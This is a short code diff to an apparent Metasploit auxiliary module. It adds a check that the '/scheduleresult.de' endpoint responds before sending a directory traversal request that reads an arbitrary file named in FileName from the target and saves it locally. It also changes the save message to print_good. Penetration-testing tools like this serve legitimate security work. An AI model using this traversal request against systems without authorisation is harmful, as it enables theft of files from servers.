@@ -46,6 +46,15 @@ class MetasploitModule < Msf::Auxiliary
     filename = datastore['FILEPATH']
 
     res = send_request_raw({
+      'uri' => "/scheduleresult.de",
+      'method' => 'GET'
+    }, 25)
+
+    if res && res.code != 200
+       return
+    end
+    
+    res = send_request_raw({
       'uri' => "/scheduleresult.de/?FileName=#{traverse}#{filename}",
       'method' => 'GET'
     }, 25)
@@ -68,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
         res.body,
         fname)
 
-      print_status("#{ip}:#{rport} - File saved in: #{path}")
+      print_good("#{ip}:#{rport} - File saved in: #{path}")
     end
   end
 end
